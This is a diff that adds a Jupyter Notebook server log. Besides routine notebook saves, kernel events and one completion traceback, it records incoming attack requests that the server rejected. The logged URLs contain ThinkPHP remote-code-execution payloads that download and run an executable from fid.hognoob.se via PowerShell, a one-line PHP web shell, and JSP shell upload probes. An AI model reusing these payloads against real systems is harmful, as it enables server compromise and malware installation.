@@ -1,0 +1,502 @@
+nohup: ignoring input
+[W 09:03:03.181 NotebookApp] WARNING: The notebook server is listening on all IP addresses and not using encryption. This is not recommended.
+[I 09:03:03.187 NotebookApp] Serving notebooks from local directory: /root/jupyter-notebook
+[I 09:03:03.187 NotebookApp] The Jupyter Notebook is running at:
+[I 09:03:03.187 NotebookApp] http://(zonk or 127.0.0.1):8888/
+[I 09:03:03.187 NotebookApp] Use Control-C to stop this server and shut down all kernels (twice to skip confirmation).
+[I 09:03:12.095 NotebookApp] Kernel started: c18a8285-03bc-44b4-995e-fc89cb2fda3b
+[I 09:03:13.313 NotebookApp] Adapting to protocol v5.1 for kernel c18a8285-03bc-44b4-995e-fc89cb2fda3b
+[I 09:07:41.628 NotebookApp] 302 GET /notebooks/ (106.39.190.109) 1.02ms
+[I 09:07:46.563 NotebookApp] Adapting to protocol v5.1 for kernel c18a8285-03bc-44b4-995e-fc89cb2fda3b
+[I 09:09:02.226 NotebookApp] Saving file at /Untitled.ipynb
+[I 09:09:22.936 NotebookApp] Saving file at /Untitled.ipynb
+[I 09:09:32.173 NotebookApp] Adapting to protocol v5.1 for kernel c18a8285-03bc-44b4-995e-fc89cb2fda3b
+[I 09:12:18.144 NotebookApp] Saving file at /Untitled.ipynb
+[I 09:13:32.658 NotebookApp] Saving file at /Untitled.ipynb
+[I 09:18:17.798 NotebookApp] Adapting to protocol v5.1 for kernel c18a8285-03bc-44b4-995e-fc89cb2fda3b
+[W 10:09:22.707 NotebookApp] 404 GET /struts2-rest-showcase/orders.xhtml (114.115.169.38) 7.36ms referer=http://114.115.221.15:8888/struts2-rest-showcase/orders.xhtml
+[W 10:09:22.710 NotebookApp] 404 GET /index.action (114.115.169.38) 1.14ms referer=http://114.115.221.15:8888/index.action
+[W 10:09:22.713 NotebookApp] 404 GET /index.do (114.115.169.38) 1.04ms referer=http://114.115.221.15:8888/index.do
+[W 10:42:34.134 NotebookApp] 404 GET http://clientapi.ipip.net/echo.php?info=1234567890 (139.162.81.62) 1.44ms referer=None
+[I 12:20:24.529 NotebookApp] Saving file at /Untitled.ipynb
+[I 12:29:36.655 NotebookApp] Adapting to protocol v5.1 for kernel c18a8285-03bc-44b4-995e-fc89cb2fda3b
+[I 12:31:36.632 NotebookApp] Saving file at /Untitled.ipynb
+[I 12:34:24.261 NotebookApp] Kernel interrupted: c18a8285-03bc-44b4-995e-fc89cb2fda3b
+[I 12:34:29.109 NotebookApp] Saving file at /Untitled.ipynb
+[I 12:35:57.824 NotebookApp] Saving file at /Untitled.ipynb
+[I 12:36:15.204 NotebookApp] Saving file at /Untitled.ipynb
+[I 12:36:21.648 NotebookApp] Adapting to protocol v5.1 for kernel c18a8285-03bc-44b4-995e-fc89cb2fda3b
+[I 12:38:01.764 NotebookApp] Adapting to protocol v5.1 for kernel c18a8285-03bc-44b4-995e-fc89cb2fda3b
+[I 12:38:21.605 NotebookApp] Saving file at /Untitled.ipynb
+[I 12:38:32.486 NotebookApp] Adapting to protocol v5.1 for kernel c18a8285-03bc-44b4-995e-fc89cb2fda3b
+[I 12:39:11.764 NotebookApp] Kernel interrupted: c18a8285-03bc-44b4-995e-fc89cb2fda3b
+[I 12:40:33.230 NotebookApp] Saving file at /Untitled.ipynb
+[I 14:12:18.816 NotebookApp] 302 GET / (196.52.43.85) 0.61ms
+[I 14:44:43.138 NotebookApp] Saving file at /Untitled.ipynb
+[I 14:44:53.335 NotebookApp] Adapting to protocol v5.1 for kernel c18a8285-03bc-44b4-995e-fc89cb2fda3b
+[I 14:46:53.327 NotebookApp] Saving file at /Untitled.ipynb
+[W 16:38:53.339 NotebookApp] WebSocket ping timeout after 119774 ms.
+[I 16:38:58.341 NotebookApp] Starting buffering for c18a8285-03bc-44b4-995e-fc89cb2fda3b:79a790526d684bd9abee2906bd2456c9
+[W 17:44:00.479 NotebookApp] 404 GET http://www.baidu.com/cache/global/img/gs.gif (80.82.70.187) 1.48ms referer=None
+[I 17:55:00.572 NotebookApp] Saving file at /Untitled.ipynb
+[I 17:55:00.849 NotebookApp] Saving file at /Untitled.ipynb
+[I 17:55:00.880 NotebookApp] Saving file at /Untitled.ipynb
+[I 17:55:17.177 NotebookApp] Saving file at /Untitled.ipynb
+[I 17:55:20.568 NotebookApp] Adapting to protocol v5.1 for kernel c18a8285-03bc-44b4-995e-fc89cb2fda3b
+[I 17:57:20.676 NotebookApp] Saving file at /Untitled.ipynb
+[W 18:23:25.267 NotebookApp] Replacing stale connection: c18a8285-03bc-44b4-995e-fc89cb2fda3b:d7a655b9d5fa4a07ac4bb79b0cfabb46
+[I 18:23:30.268 NotebookApp] Starting buffering for c18a8285-03bc-44b4-995e-fc89cb2fda3b:d7a655b9d5fa4a07ac4bb79b0cfabb46
+[I 18:23:30.269 NotebookApp] Adapting to protocol v5.1 for kernel c18a8285-03bc-44b4-995e-fc89cb2fda3b
+[I 18:23:30.270 NotebookApp] Restoring connection for c18a8285-03bc-44b4-995e-fc89cb2fda3b:d7a655b9d5fa4a07ac4bb79b0cfabb46
+[I 18:35:22.456 NotebookApp] Saving file at /Untitled.ipynb
+[I 18:37:22.468 NotebookApp] Saving file at /Untitled.ipynb
+[I 18:39:22.562 NotebookApp] Saving file at /Untitled.ipynb
+[I 18:43:53.131 NotebookApp] Saving file at /Untitled.ipynb
+[I 18:44:13.168 NotebookApp] Kernel interrupted: c18a8285-03bc-44b4-995e-fc89cb2fda3b
+[W 18:48:59.134 NotebookApp] 404 HEAD http://123.125.114.144/ (180.95.238.152) 2.01ms referer=None
+[W 19:45:00.270 NotebookApp] WebSocket ping timeout after 119895 ms.
+[I 19:45:05.274 NotebookApp] Starting buffering for c18a8285-03bc-44b4-995e-fc89cb2fda3b:d7a655b9d5fa4a07ac4bb79b0cfabb46
+[I 20:08:33.044 NotebookApp] 302 GET /notebooks/ (106.39.190.142) 0.94ms
+[W 20:51:54.315 NotebookApp] 404 GET http://www.qq.com/404/search_children.js (120.132.3.65) 1.35ms referer=None
+[W 21:07:48.849 NotebookApp] 404 GET http://110.249.212.46/testget?q=23333&port=8888 (110.249.212.46) 1.42ms referer=None
+[I 22:14:51.099 NotebookApp] Kernel shutdown: c18a8285-03bc-44b4-995e-fc89cb2fda3b
+[I 22:15:09.567 NotebookApp] Creating new notebook in 
+[I 22:15:10.868 NotebookApp] Kernel started: 5b66df68-ca3b-4383-99d1-75c2f91838e7
+[I 22:15:12.130 NotebookApp] Adapting to protocol v5.1 for kernel 5b66df68-ca3b-4383-99d1-75c2f91838e7
+[I 22:15:47.949 NotebookApp] Saving file at /Untitled.ipynb
+[I 22:30:09.119 NotebookApp] Adapting to protocol v5.1 for kernel 5b66df68-ca3b-4383-99d1-75c2f91838e7
+[I 22:30:32.007 NotebookApp] Saving file at /Untitled.ipynb
+[I 22:30:32.042 NotebookApp] Saving file at /Untitled.ipynb
+[I 22:30:32.167 NotebookApp] Saving file at /Untitled.ipynb
+[I 22:30:32.191 NotebookApp] Saving file at /Untitled.ipynb
+[I 22:30:32.216 NotebookApp] Saving file at /Untitled.ipynb
+[I 22:30:32.232 NotebookApp] Saving file at /Untitled.ipynb
+[I 22:30:34.232 NotebookApp] Kernel interrupted: 5b66df68-ca3b-4383-99d1-75c2f91838e7
+[I 23:09:17.611 NotebookApp] Starting buffering for 5b66df68-ca3b-4383-99d1-75c2f91838e7:0d5a80f5d307480da2d50fb722c9f91c
+[W 03:52:18.439 NotebookApp] 404 GET http://www.baidu.com/cache/global/img/gs.gif (80.82.70.187) 1.50ms referer=None
+[I 09:41:45.460 NotebookApp] Adapting to protocol v5.1 for kernel 5b66df68-ca3b-4383-99d1-75c2f91838e7
+[I 09:41:53.742 NotebookApp] Kernel shutdown: 5b66df68-ca3b-4383-99d1-75c2f91838e7
+[W 09:41:53.746 NotebookApp] delete /Untitled.ipynb
+[I 09:41:56.342 NotebookApp] Kernel started: 9e4b6230-54a6-41a0-984e-07f5c8602dc8
+[I 09:41:57.608 NotebookApp] Adapting to protocol v5.1 for kernel 9e4b6230-54a6-41a0-984e-07f5c8602dc8
+[W 09:46:55.739 NotebookApp] 404 GET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe');start%20%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe (114.115.169.38) 2.24ms referer=http://114.115.221.15:8888/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe');start %SystemRoot%/Temp/gocyrqwpxsulimv16735.exe
+[W 09:46:55.742 NotebookApp] 404 GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php (114.115.169.38) 1.22ms referer=http://114.115.221.15:8888/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo ^<?php $action = $_GET['xcmd'];system($action);?^>>hydra.php
+[W 09:46:55.746 NotebookApp] 404 GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe');start%20%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe (114.115.169.38) 1.13ms referer=http://114.115.221.15:8888/public/hydra.php?xcmd=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe');start %SystemRoot%/Temp/gocyrqwpxsulimv16735.exe
+[I 09:53:07.843 NotebookApp] Creating new notebook in 
+[I 09:53:09.220 NotebookApp] Kernel started: d4a98592-0bfd-45bb-ae21-a0be269e8876
+[I 09:53:10.452 NotebookApp] Adapting to protocol v5.1 for kernel d4a98592-0bfd-45bb-ae21-a0be269e8876
+[I 09:55:09.295 NotebookApp] Saving file at /Untitled.ipynb
+[I 09:57:09.356 NotebookApp] Saving file at /Untitled.ipynb
+[I 09:59:09.316 NotebookApp] Saving file at /Untitled.ipynb
+[I 10:01:09.399 NotebookApp] Saving file at /Untitled.ipynb
+[I 10:01:39.900 NotebookApp] Kernel interrupted: d4a98592-0bfd-45bb-ae21-a0be269e8876
+[I 10:03:09.290 NotebookApp] Saving file at /Untitled.ipynb
+[I 10:03:37.960 NotebookApp] Saving file at /Untitled.ipynb
+[I 10:03:41.214 NotebookApp] Starting buffering for d4a98592-0bfd-45bb-ae21-a0be269e8876:9b75fd627d4a4e0799216e1acfb9af72
+[I 10:03:44.710 NotebookApp] Adapting to protocol v5.1 for kernel d4a98592-0bfd-45bb-ae21-a0be269e8876
+[I 10:05:44.830 NotebookApp] Saving file at /Untitled.ipynb
+[I 10:07:44.689 NotebookApp] Saving file at /Untitled.ipynb
+[I 10:09:44.670 NotebookApp] Saving file at /Untitled.ipynb
+[W 10:18:46.772 NotebookApp] 403 PUT /FxCodeShell.jsp%20 (114.115.169.38): '_xsrf' argument missing from POST
+[W 10:18:46.775 NotebookApp] 403 PUT /FxCodeShell.jsp%20 (114.115.169.38) 4.90ms referer=http://114.115.221.15:8888/FxCodeShell.jsp%20
+[W 10:18:46.778 NotebookApp] 403 PUT /FxCodeShell.jsp::$DATA (114.115.169.38): '_xsrf' argument missing from POST
+[W 10:18:46.779 NotebookApp] 403 PUT /FxCodeShell.jsp::$DATA (114.115.169.38) 1.45ms referer=http://114.115.221.15:8888/FxCodeShell.jsp::$DATA
+[W 10:18:46.782 NotebookApp] 403 PUT /FxCodeShell.jsp/ (114.115.169.38): '_xsrf' argument missing from POST
+[W 10:18:46.782 NotebookApp] 403 PUT /FxCodeShell.jsp/ (114.115.169.38) 0.53ms referer=http://114.115.221.15:8888/FxCodeShell.jsp/
+[W 10:18:46.785 NotebookApp] 404 GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe (114.115.169.38) 1.08ms referer=http://114.115.221.15:8888/FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe
+[I 10:19:44.867 NotebookApp] Saving file at /Untitled.ipynb
+[I 10:21:44.680 NotebookApp] Saving file at /Untitled.ipynb
+[I 10:23:44.830 NotebookApp] Saving file at /Untitled.ipynb
+[I 10:25:44.812 NotebookApp] Saving file at /Untitled.ipynb
+[W 10:26:16.767 NotebookApp] 404 HEAD http://123.125.114.144/ (220.184.97.122) 2.12ms referer=None
+[I 10:27:45.434 NotebookApp] Saving file at /Untitled.ipynb
+[I 10:29:45.784 NotebookApp] Saving file at /Untitled.ipynb
+[I 10:31:45.449 NotebookApp] Saving file at /Untitled.ipynb
+[I 10:33:46.099 NotebookApp] Saving file at /Untitled.ipynb
+[I 10:35:46.798 NotebookApp] Saving file at /Untitled.ipynb
+[I 10:37:47.266 NotebookApp] Saving file at /Untitled.ipynb
+[I 10:39:46.853 NotebookApp] Saving file at /Untitled.ipynb
+[I 10:41:46.851 NotebookApp] Saving file at /Untitled.ipynb
+[I 10:43:46.819 NotebookApp] Saving file at /Untitled.ipynb
+[I 10:45:47.138 NotebookApp] Saving file at /Untitled.ipynb
+[I 10:47:46.943 NotebookApp] Saving file at /Untitled.ipynb
+[I 10:49:47.022 NotebookApp] Saving file at /Untitled.ipynb
+[I 10:51:47.124 NotebookApp] Saving file at /Untitled.ipynb
+[I 10:53:47.042 NotebookApp] Saving file at /Untitled.ipynb
+[I 10:57:47.476 NotebookApp] Saving file at /Untitled.ipynb
+[I 10:59:48.963 NotebookApp] Saving file at /Untitled.ipynb
+[I 11:01:47.161 NotebookApp] Saving file at /Untitled.ipynb
+[I 11:03:47.360 NotebookApp] Saving file at /Untitled.ipynb
+[I 11:05:46.914 NotebookApp] Saving file at /Untitled.ipynb
+[I 11:07:46.895 NotebookApp] Saving file at /Untitled.ipynb
+[I 11:09:46.907 NotebookApp] Saving file at /Untitled.ipynb
+[I 11:11:46.953 NotebookApp] Saving file at /Untitled.ipynb
+[I 11:13:46.928 NotebookApp] Saving file at /Untitled.ipynb
+[I 11:15:46.973 NotebookApp] Saving file at /Untitled.ipynb
+[I 11:17:46.981 NotebookApp] Saving file at /Untitled.ipynb
+[I 11:17:58.793 NotebookApp] Saving file at /matplotlib_test.ipynb
+[I 11:19:46.964 NotebookApp] Saving file at /Untitled.ipynb
+[I 11:21:47.113 NotebookApp] Saving file at /Untitled.ipynb
+[I 11:21:58.840 NotebookApp] Saving file at /matplotlib_test.ipynb
+[I 11:23:47.039 NotebookApp] Saving file at /Untitled.ipynb
+[I 11:25:47.076 NotebookApp] Saving file at /Untitled.ipynb
+[I 11:27:47.112 NotebookApp] Saving file at /Untitled.ipynb
+[I 11:29:47.024 NotebookApp] Saving file at /Untitled.ipynb
+[I 11:31:47.220 NotebookApp] Saving file at /Untitled.ipynb
+[I 11:31:58.903 NotebookApp] Saving file at /matplotlib_test.ipynb
+[I 12:21:59.371 NotebookApp] 302 GET / (184.154.189.90) 0.64ms
+[I 12:21:59.587 NotebookApp] 302 GET /tree? (184.154.189.90) 1.21ms
+[W 12:22:37.747 NotebookApp] 404 GET http://clientapi.ipip.net/echo.php?info=1234567890 (139.162.81.62) 1.55ms referer=None
+[I 12:51:05.572 NotebookApp] Starting buffering for d4a98592-0bfd-45bb-ae21-a0be269e8876:08fdd83e01124da88f1513f4bed87dbf
+[I 12:51:13.528 NotebookApp] Adapting to protocol v5.1 for kernel d4a98592-0bfd-45bb-ae21-a0be269e8876
+[W 13:23:54.566 NotebookApp] 403 PUT /FxCodeShell.jsp%20 (114.115.184.18): '_xsrf' argument missing from POST
+[W 13:23:54.567 NotebookApp] 403 PUT /FxCodeShell.jsp%20 (114.115.184.18) 1.85ms referer=http://114.115.221.15:8888/FxCodeShell.jsp%20
+[W 13:23:54.569 NotebookApp] 403 PUT /FxCodeShell.jsp::$DATA (114.115.184.18): '_xsrf' argument missing from POST
+[W 13:23:54.570 NotebookApp] 403 PUT /FxCodeShell.jsp::$DATA (114.115.184.18) 1.32ms referer=http://114.115.221.15:8888/FxCodeShell.jsp::$DATA
+[W 13:23:54.571 NotebookApp] 403 PUT /FxCodeShell.jsp/ (114.115.184.18): '_xsrf' argument missing from POST
+[W 13:23:54.572 NotebookApp] 403 PUT /FxCodeShell.jsp/ (114.115.184.18) 0.60ms referer=http://114.115.221.15:8888/FxCodeShell.jsp/
+[W 13:23:54.574 NotebookApp] 404 GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe (114.115.184.18) 1.02ms referer=http://114.115.221.15:8888/FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe
+[W 13:43:32.611 NotebookApp] 404 GET /wp-content/plugins/ninja-forms-uploads/readme.txt (112.193.169.138) 1.45ms referer=None
+[W 14:01:55.142 NotebookApp] 404 GET http://www.baidu.com/cache/global/img/gs.gif (80.82.70.187) 1.39ms referer=None
+[I 14:36:25.373 NotebookApp] Starting buffering for 9e4b6230-54a6-41a0-984e-07f5c8602dc8:875da5c528da49c88cb3ca79b30bc8ec
+[W 14:38:43.531 NotebookApp] WebSocket ping timeout after 119967 ms.
+[I 14:38:48.532 NotebookApp] Starting buffering for d4a98592-0bfd-45bb-ae21-a0be269e8876:7caacd29944c498f9375d7e8839ef549
+[W 14:39:08.921 NotebookApp] 404 GET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/oelqwtpkbrqtttz19268.exe');start%20%SystemRoot%/Temp/oelqwtpkbrqtttz19268.exe (114.115.184.18) 1.47ms referer=http://114.115.221.15:8888/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/oelqwtpkbrqtttz19268.exe');start %SystemRoot%/Temp/oelqwtpkbrqtttz19268.exe
+[W 14:39:08.923 NotebookApp] 404 GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php (114.115.184.18) 1.18ms referer=http://114.115.221.15:8888/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo ^<?php $action = $_GET['xcmd'];system($action);?^>>hydra.php
+[W 14:39:08.925 NotebookApp] 404 GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/oelqwtpkbrqtttz19268.exe');start%20%SystemRoot%/Temp/oelqwtpkbrqtttz19268.exe (114.115.184.18) 1.09ms referer=http://114.115.221.15:8888/public/hydra.php?xcmd=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/oelqwtpkbrqtttz19268.exe');start %SystemRoot%/Temp/oelqwtpkbrqtttz19268.exe
+[I 15:29:39.424 NotebookApp] Adapting to protocol v5.1 for kernel d4a98592-0bfd-45bb-ae21-a0be269e8876
+[I 15:36:09.028 NotebookApp] Kernel shutdown: d4a98592-0bfd-45bb-ae21-a0be269e8876
+[I 15:37:05.721 NotebookApp] Creating new notebook in 
+[I 15:37:07.093 NotebookApp] Kernel started: 497a04ee-ad88-44d6-827e-e38d099cc946
+[I 15:37:08.353 NotebookApp] Adapting to protocol v5.1 for kernel 497a04ee-ad88-44d6-827e-e38d099cc946
+[I 15:39:07.193 NotebookApp] Saving file at /Untitled.ipynb
+[I 15:41:07.193 NotebookApp] Saving file at /Untitled.ipynb
+[I 15:43:07.199 NotebookApp] Saving file at /Untitled.ipynb
+[W 15:44:03.663 NotebookApp] 404 GET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe');start%20%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe (114.115.169.38) 1.69ms referer=http://114.115.221.15:8888/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe');start %SystemRoot%/Temp/gocyrqwpxsulimv16735.exe
+[W 15:44:03.666 NotebookApp] 404 GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php (114.115.169.38) 1.18ms referer=http://114.115.221.15:8888/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo ^<?php $action = $_GET['xcmd'];system($action);?^>>hydra.php
+[W 15:44:03.669 NotebookApp] 404 GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe');start%20%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe (114.115.169.38) 1.04ms referer=http://114.115.221.15:8888/public/hydra.php?xcmd=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe');start %SystemRoot%/Temp/gocyrqwpxsulimv16735.exe
+[I 15:45:07.183 NotebookApp] Saving file at /Untitled.ipynb
+[I 15:47:07.252 NotebookApp] Saving file at /Untitled.ipynb
+[I 15:49:07.188 NotebookApp] Saving file at /Untitled.ipynb
+[I 15:51:07.195 NotebookApp] Saving file at /Untitled.ipynb
+[I 15:53:07.198 NotebookApp] Saving file at /Untitled.ipynb
+[I 15:55:07.206 NotebookApp] Saving file at /Untitled.ipynb
+[I 15:57:07.221 NotebookApp] Saving file at /Untitled.ipynb
+[I 15:58:24.331 NotebookApp] Saving file at /Untitled.ipynb
+[I 15:58:27.099 NotebookApp] Starting buffering for 497a04ee-ad88-44d6-827e-e38d099cc946:0bddda01ed2048a78524d2dd86cc11c8
+[I 15:58:31.713 NotebookApp] Kernel shutdown: 497a04ee-ad88-44d6-827e-e38d099cc946
+[I 16:01:20.216 NotebookApp] Creating new notebook in 
+[I 16:01:21.510 NotebookApp] Kernel started: c01b0c20-23b9-4a91-9c42-120d410b5349
+[I 16:01:22.730 NotebookApp] Adapting to protocol v5.1 for kernel c01b0c20-23b9-4a91-9c42-120d410b5349
+[I 16:03:21.621 NotebookApp] Saving file at /Untitled.ipynb
+[I 16:05:21.581 NotebookApp] Saving file at /Untitled.ipynb
+[I 16:07:21.607 NotebookApp] Saving file at /Untitled.ipynb
+[I 16:09:21.597 NotebookApp] Saving file at /Untitled.ipynb
+[I 16:11:21.619 NotebookApp] Saving file at /Untitled.ipynb
+[I 16:13:21.621 NotebookApp] Saving file at /Untitled.ipynb
+[I 16:15:21.654 NotebookApp] Saving file at /Untitled.ipynb
+[I 16:17:21.616 NotebookApp] Saving file at /Untitled.ipynb
+[I 16:25:21.629 NotebookApp] Saving file at /Untitled.ipynb
+[I 16:27:21.659 NotebookApp] Saving file at /Untitled.ipynb
+[I 16:29:21.619 NotebookApp] Saving file at /Untitled.ipynb
+[I 16:31:21.635 NotebookApp] Saving file at /Untitled.ipynb
+[I 16:33:21.652 NotebookApp] Saving file at /Untitled.ipynb
+[I 16:35:21.625 NotebookApp] Saving file at /Untitled.ipynb
+[I 16:37:21.618 NotebookApp] Saving file at /Untitled.ipynb
+[I 16:39:21.598 NotebookApp] Saving file at /Untitled.ipynb
+[I 16:41:03.812 NotebookApp] Saving file at /Untitled.ipynb
+[I 16:41:22.899 NotebookApp] Saving file at /Untitled.ipynb
+[I 16:41:25.126 NotebookApp] Kernel interrupted: c01b0c20-23b9-4a91-9c42-120d410b5349
+[I 16:41:51.748 NotebookApp] Starting buffering for c01b0c20-23b9-4a91-9c42-120d410b5349:b48ff87afdac44f788aedd06dcd53173
+[I 16:44:11.828 NotebookApp] Kernel shutdown: c01b0c20-23b9-4a91-9c42-120d410b5349
+[I 16:44:48.000 NotebookApp] Creating new notebook in 
+[I 16:44:49.308 NotebookApp] Kernel started: bda5aa41-9163-4011-858c-dcde8169d84d
+[I 16:44:50.544 NotebookApp] Adapting to protocol v5.1 for kernel bda5aa41-9163-4011-858c-dcde8169d84d
+[I 16:44:59.523 NotebookApp] Kernel shutdown: bda5aa41-9163-4011-858c-dcde8169d84d
+[I 16:45:18.347 NotebookApp] Kernel started: 2ee780b2-7766-4483-ad50-d770e7ce8b06
+[I 16:45:19.592 NotebookApp] Adapting to protocol v5.1 for kernel 2ee780b2-7766-4483-ad50-d770e7ce8b06
+[W 16:45:20.056 NotebookApp] 404 GET /api/contents/Untitled.ipynb?content=0&_=1558514688546 (223.65.190.154): No such file or directory: Untitled.ipynb
+[W 16:45:20.056 NotebookApp] No such file or directory: Untitled.ipynb
+[W 16:45:20.057 NotebookApp] 404 GET /api/contents/Untitled.ipynb?content=0&_=1558514688546 (223.65.190.154) 1.44ms referer=http://114.115.221.15:8888/notebooks/Untitled.ipynb?kernel_name=python3
+[I 16:47:18.565 NotebookApp] Saving file at /pandas层级索引.ipynb
+[I 16:49:18.434 NotebookApp] Saving file at /pandas层级索引.ipynb
+[I 17:21:35.226 NotebookApp] 302 GET /notebooks/ (123.150.183.206) 1.01ms
+[W 17:21:54.437 NotebookApp] 404 HEAD http://123.125.114.144/ (1.31.114.102) 2.18ms referer=None
+[I 18:59:18.534 NotebookApp] Saving file at /pandas层级索引.ipynb
+[I 19:01:18.480 NotebookApp] Saving file at /pandas层级索引.ipynb
+[I 19:03:18.487 NotebookApp] Saving file at /pandas层级索引.ipynb
+[I 19:17:19.853 NotebookApp] Saving file at /pandas层级索引.ipynb
+[I 19:19:19.501 NotebookApp] Saving file at /pandas层级索引.ipynb
+[IPKernelApp] ERROR | Exception in message handler:
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.5/dist-packages/jedi/cache.py", line 141, in wrapper
+    return dct[key]
+KeyError: ((), frozenset())
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.5/dist-packages/ipykernel/kernelbase.py", line 272, in dispatch_shell
+    yield gen.maybe_future(handler(stream, idents, msg))
+  File "/usr/local/lib/python3.5/dist-packages/tornado/gen.py", line 729, in run
+    value = future.result()
+  File "/usr/lib/python3.5/asyncio/futures.py", line 274, in result
+    raise self._exception
+  File "/usr/local/lib/python3.5/dist-packages/tornado/gen.py", line 209, in wrapper
+    yielded = next(result)
+  File "/usr/local/lib/python3.5/dist-packages/ipykernel/kernelbase.py", line 580, in complete_request
+    matches = yield gen.maybe_future(self.do_complete(code, cursor_pos))
+  File "/usr/local/lib/python3.5/dist-packages/ipykernel/ipkernel.py", line 348, in do_complete
+    return self._experimental_do_complete(code, cursor_pos)
+  File "/usr/local/lib/python3.5/dist-packages/ipykernel/ipkernel.py", line 373, in _experimental_do_complete
+    completions = list(_rectify_completions(code, raw_completions))
+  File "/usr/local/lib/python3.5/dist-packages/IPython/core/completer.py", line 491, in rectify_completions
+    completions = list(completions)
+  File "/usr/local/lib/python3.5/dist-packages/IPython/core/completer.py", line 1820, in completions
+    for c in self._completions(text, offset, _timeout=self.jedi_compute_type_timeout/1000):
+  File "/usr/local/lib/python3.5/dist-packages/IPython/core/completer.py", line 1877, in _completions
+    signature = _make_signature(jm)
+  File "/usr/local/lib/python3.5/dist-packages/IPython/core/completer.py", line 996, in _make_signature
+    return '(%s)'% ', '.join([f for f in (_formatparamchildren(p) for p in completion.params) if f])
+  File "/usr/local/lib/python3.5/dist-packages/jedi/cache.py", line 143, in wrapper
+    result = method(self, *args, **kwargs)
+  File "/usr/local/lib/python3.5/dist-packages/jedi/api/classes.py", line 345, in params
+    raise AttributeError('There are no params defined on this.')
+AttributeError: There are no params defined on this.
+[I 19:21:21.668 NotebookApp] Saving file at /pandas层级索引.ipynb
+[I 19:23:00.843 NotebookApp] Creating new notebook in 
+[I 19:23:02.240 NotebookApp] Kernel started: 784095ba-c0c1-4ecc-ae8a-a1fe7dd4b153
+[I 19:23:03.483 NotebookApp] Adapting to protocol v5.1 for kernel 784095ba-c0c1-4ecc-ae8a-a1fe7dd4b153
+[I 19:23:08.337 NotebookApp] Saving file at /Untitled.ipynb
+[I 19:23:19.957 NotebookApp] Saving file at /pandas层级索引.ipynb
+[I 19:23:42.352 NotebookApp] Saving file at /pandas层级索引.ipynb
+[I 19:23:43.392 NotebookApp] Starting buffering for 2ee780b2-7766-4483-ad50-d770e7ce8b06:d91293a682e64067899d396c8691ec68
+[I 19:23:53.583 NotebookApp] Kernel shutdown: 2ee780b2-7766-4483-ad50-d770e7ce8b06
+[W 19:23:53.585 NotebookApp] 404 DELETE /api/sessions/d74bd6b0-779c-47c3-bdb0-33bb4a4567fd (223.65.190.154): Session not found: session_id='d74bd6b0-779c-47c3-bdb0-33bb4a4567fd'
